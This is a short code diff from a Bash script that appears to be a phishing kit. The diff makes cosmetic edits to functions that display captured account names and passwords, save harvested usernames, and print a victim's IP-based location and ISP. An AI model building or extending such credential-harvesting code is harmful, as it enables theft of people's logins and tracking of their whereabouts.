@@ -210,7 +210,7 @@ catch_cred() {
     printf "${GREEN}[-]${ORANGE} Account: ${RED} %s\n" $account
     printf "${GREEN}[-]${ORANGE} Password: ${RED} %s\n" $password
     cat sites/$website/usernames.txt >> sites/$website/saved.usernames.txt
-    printf "${GREEN}[-]${ORANGE}  Saved:${RED} sites/%s/saved.usernames.txt \n" $website
+    printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" $website
     killall -2 php > /dev/null 2>&1
     killall -2 ngrok > /dev/null 2>&1
     printf "\n"
@@ -257,8 +257,7 @@ ip_location() {
     printf "  ${ORANGE}  Longitude >>    ${GREEN}    $userlon\n"
     printf "  ${ORANGE}  Time Zone >>    ${GREEN}    $usertime\n"
     printf "  ${ORANGE}  Postal Code >>  ${GREEN}    $userpostal\n"
-    printf "  ${ORANGE}  ISP >>          ${GREEN}   $userisp\n"
-    printf "  ${ORANGE}  ASN >>          ${GREEN}   $userasn\n"
+    printf "  ${ORANGE}  Carrier >>          ${GREEN}   $userisp\n"
     printf "  ${ORANGE}  Country Code >> ${GREEN}   $usercountrycode\n"
     printf "  ${ORANGE}  Currency >>     ${GREEN}   $usercurrency\n"
     printf "  ${ORANGE}  Languages >>    ${GREEN}   $userlanguage\n"
